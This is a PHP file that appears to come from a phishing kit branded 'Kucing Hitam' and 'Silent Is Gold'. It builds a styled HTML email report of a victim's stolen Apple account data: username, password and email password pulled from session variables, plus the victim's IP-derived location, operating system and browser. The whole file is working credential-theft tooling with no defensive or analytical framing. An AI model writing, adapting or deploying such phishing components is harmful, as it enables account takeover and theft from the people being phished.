<?php @error_reporting(0);

$message   = "
<html>
<head>
<style>
@media (max-width: 520px) {
      .block-grid {
        min-width: 320px!important;
        max-width: 100%!important;
        width: 100%!important;
        display: block!important;
      }

      .col {
        min-width: 320px!important;
        max-width: 100%!important;
        width: 100%!important;
        display: block!important;
      }

        .col > div {
          margin: 0 auto;
        }

      img.fullwidth {
        max-width: 100%!important;
      }
      img.fullwidthOnMobile {
        max-width: 100%!important;
      }
      .no-stack .col {
        min-width: 0!important;
        display: table-cell!important;
      }
      .no-stack.two-up .col {
        width: 50%!important;
      }
      .no-stack.mixed-two-up .col.num4 {
        width: 33%!important;
      }
      .no-stack.mixed-two-up .col.num8 {
        width: 66%!important;
      }
      .no-stack.three-up .col.num4 {
        width: 33%!important;
      }
      .no-stack.four-up .col.num3 {
        width: 25%!important;
      }
      .mobile_hide {
        min-height: 0px!important;
        max-height: 0px!important;
        max-width: 0px!important;
        display: none!important;
        overflow: hidden!important;
        font-size: 0px!important;
      }
    }
</style>
<table class='nl-container' style='border-collapse: collapse;table-layout: fixed;border-spacing: 0;mso-table-lspace: 0pt;mso-table-rspace: 0pt;vertical-align: top;min-width: 320px;Margin: 0 auto;background-color: #FFFFFF;width: 100%' cellpadding='0' cellspacing='0'>
  <tbody>
  <tr style='vertical-align: top'>
    <td style='word-break: break-word;border-collapse: collapse !important;vertical-align: top'>
    <!--[if (mso)|(IE)]><table width='100%' cellpadding='0' cellspacing='0' border='0'><tr><td align='center' style='background-color: #FFFFFF;'><![endif]-->

    <div style='background-color:transparent;'>
      <div style='Margin: 0 auto;min-width: 320px;max-width: 480px;overflow-wrap: break-word;word-wrap: break-word;word-break: break-word;background-color: #FFFFFF;' class='block-grid '>
        <div style='border-collapse: collapse;display: table;width: 100%;background-color:#FFFFFF;'>
          <!--[if (mso)|(IE)]><table width='100%' cellpadding='0' cellspacing='0' border='0'><tr><td style='background-color:transparent;' align='center'><table cellpadding='0' cellspacing='0' border='0' style='width: 480px;'><tr class='layout-full-width' style='background-color:#FFFFFF;'><![endif]-->

              <!--[if (mso)|(IE)]><td align='center' width='480' style='background-color:#000000; width:480px; padding-right: 0px; padding-left: 0px; padding-top:5px; padding-bottom:5px; border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent;' valign='top'><![endif]-->
            <div class='col num12' style='min-width: 320px;max-width: 480px;display: table-cell;vertical-align: top;'>
              <div style='background-color: #000000; width: 100% !important;'>
              <!--[if (!mso)&(!IE)]><!--><div style='border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent; padding-top:5px; padding-bottom:5px; padding-right: 0px; padding-left: 0px;'><!--<![endif]-->

                  
                    <div class=''>
  <!--[if mso]><table width='100%' cellpadding='0' cellspacing='0' border='0'><tr><td style='padding-right: 60px; padding-left: 60px; padding-top: 10px; padding-bottom: 10px;'><![endif]-->
  <div style='color:#FFFFFF;line-height:150%;font-family:Tahoma, Verdana, Segoe, sans-serif; padding-right: 60px; padding-left: 60px; padding-top: 10px; padding-bottom: 10px;'>  
    <div style='font-size:12px;line-height:18px;color:#FFFFFF;font-family:Tahoma, Verdana, Segoe, sans-serif;text-align:left;'><p style='margin: 0;font-size: 14px;line-height: 21px'><font color='orange'>[+]---------------[ <font color='red'>Kucing</font> <font color='white'>Hitam</font> <font color='blue'>Login</font> ]-------------------[+]</font></p></div>  
  </div>
  <!--[if mso]></td></tr></table><![endif]-->
</div>
                  
              <!--[if (!mso)&(!IE)]><!--></div><!--<![endif]-->
              </div>
            </div>
          <!--[if (mso)|(IE)]></td></tr></table></td></tr></table><![endif]-->
        </div>
      </div>
    </div>    <div style='background-color:transparent;'>
      <div style='Margin: 0 auto;min-width: 320px;max-width: 480px;overflow-wrap: break-word;word-wrap: break-word;word-break: break-word;background-color: #FFFFFF;' class='block-grid '>
        <div style='border-collapse: collapse;display: table;width: 100%;background-color:#FFFFFF;'>
          <!--[if (mso)|(IE)]><table width='100%' cellpadding='0' cellspacing='0' border='0'><tr><td style='background-color:transparent;' align='center'><table cellpadding='0' cellspacing='0' border='0' style='width: 480px;'><tr class='layout-full-width' style='background-color:#FFFFFF;'><![endif]-->

              <!--[if (mso)|(IE)]><td align='center' width='480' style=' width:480px; padding-right: 0px; padding-left: 0px; padding-top:5px; padding-bottom:5px; border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent;' valign='top'><![endif]-->
            <div class='col num12' style='min-width: 320px;max-width: 480px;display: table-cell;vertical-align: top;'>
              <div style='background-color: transparent; width: 100% !important;'>
              <!--[if (!mso)&(!IE)]><!--><div style='border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent; padding-top:5px; padding-bottom:5px; padding-right: 0px; padding-left: 0px;'><!--<![endif]-->

                  
                    <div class=''>
  <!--[if mso]><table width='100%' cellpadding='0' cellspacing='0' border='0'><tr><td style='padding-right: 10px; padding-left: 10px; padding-top: 10px; padding-bottom: 10px;'><![endif]-->
  <div style='color:#555555;line-height:200%;font-family:Tahoma, Verdana, Segoe, sans-serif; padding-right: 10px; padding-left: 10px; padding-top: 10px; padding-bottom: 10px;'>  
    <div style='font-size:12px;line-height:24px;color:#555555;font-family:Tahoma, Verdana, Segoe, sans-serif;text-align:left;'><p style='margin: 0;font-size: 12px;line-height: 24px'>++=================== [ Apple Account ] =================++</p><p style='margin: 0;font-size: 12px;line-height: 24px'><img width='20px' height='18px' align='center' src='http://icon-icons.com/icons2/934/PNG/128/person-black-user-shape_icon-icons.com_72962.png'/> Username :  ".$_SESSION['user']."<br><img width='21px' height='19px' align='center' src='https://cdn0.iconfinder.com/data/icons/thin-security/57/thin-433_key_lock_security_password_secure-256.png'/> Password : ".$_SESSION['pass']."<br><img width='21px' height='19px' align='center' src='https://cdn0.iconfinder.com/data/icons/thin-security/57/thin-433_key_lock_security_password_secure-256.png'/> Email Password : ".$_SESSION['epass']."</p><p style='margin: 0;font-size: 12px;line-height: 24px'>+=================== [ Device Info ] ==================++</p><p style='margin: 0;font-size: 12px;line-height: 24px'>
<img width='20px' height='18px' align='center' src='https://cdn0.iconfinder.com/data/icons/thin-navigation/57/thin-122_location_pin_map-256.png'/> From            :  $VictimInfo1<br>
<img width='20px' height='18px' align='center' src='https://cdn0.iconfinder.com/data/icons/thin-navigation/57/thin-122_location_pin_map-256.png'/> Location        :  $VictimInfo2<br>
<img width='20px' height='18px' align='center' src='https://www.shareicon.net/data/128x128/2015/11/08/668694_windows_512x512.png'/> Platform        : $os<br>
<img width='20px' height='18px' align='center' src='https://www.shareicon.net/data/128x128/2015/09/25/107200_browser_512x512.png'/> Browser         : $br</p></div> 
  </div>
  <!--[if mso]></td></tr></table><![endif]-->
</div>
                  
              <!--[if (!mso)&(!IE)]><!--></div><!--<![endif]-->
              </div>
            </div>
          <!--[if (mso)|(IE)]></td></tr></table></td></tr></table><![endif]-->
        </div>
      </div>
    </div>    <div style='background-color:transparent;'>
      <div style='Margin: 0 auto;min-width: 320px;max-width: 480px;overflow-wrap: break-word;word-wrap: break-word;word-break: break-word;background-color: #FFFFFF;' class='block-grid '>
        <div style='border-collapse: collapse;display: table;width: 100%;background-color:#FFFFFF;'>
          <!--[if (mso)|(IE)]><table width='100%' cellpadding='0' cellspacing='0' border='0'><tr><td style='background-color:transparent;' align='center'><table cellpadding='0' cellspacing='0' border='0' style='width: 480px;'><tr class='layout-full-width' style='background-color:#FFFFFF;'><![endif]-->

              <!--[if (mso)|(IE)]><td align='center' width='480' style='background-color:#000000; width:480px; padding-right: 0px; padding-left: 0px; padding-top:5px; padding-bottom:5px; border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent;' valign='top'><![endif]-->
            <div class='col num12' style='min-width: 320px;max-width: 480px;display: table-cell;vertical-align: top;'>
              <div style='background-color: #000000; width: 100% !important;'>
              <!--[if (!mso)&(!IE)]><!--><div style='border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent; padding-top:5px; padding-bottom:5px; padding-right: 0px; padding-left: 0px;'><!--<![endif]-->

                  
                    <div class=''>
  <!--[if mso]><table width='100%' cellpadding='0' cellspacing='0' border='0'><tr><td style='padding-right: 60px; padding-left: 60px; padding-top: 10px; padding-bottom: 10px;'><![endif]-->
  <div style='color:#FFFFFF;line-height:150%;font-family:Tahoma, Verdana, Segoe, sans-serif; padding-right: 60px; padding-left: 60px; padding-top: 10px; padding-bottom: 10px;'>  
    <div style='font-size:12px;line-height:18px;color:#FFFFFF;font-family:Tahoma, Verdana, Segoe, sans-serif;text-align:left;'><p style='margin: 0;font-size: 14px;line-height: 21px'><font color='orange'>[+]---------------------[ <font color='red'>Silent</font> <font color='white'>Is</font> <font color='blue'>Gold</font> ]---------------------[+]</font></p></div> 
  </div>
  <!--[if mso]></td></tr></table><![endif]-->
</div>
                  
              <!--[if (!mso)&(!IE)]><!--></div><!--<![endif]-->
              </div>
            </div>
          <!--[if (mso)|(IE)]></td></tr></table></td></tr></table><![endif]-->
        </div>
      </div>
    </div>   <!--[if (mso)|(IE)]></td></tr></table><![endif]-->
    </td>
  </tr>
  </tbody>
  </table>
 
</body></html>
";

?>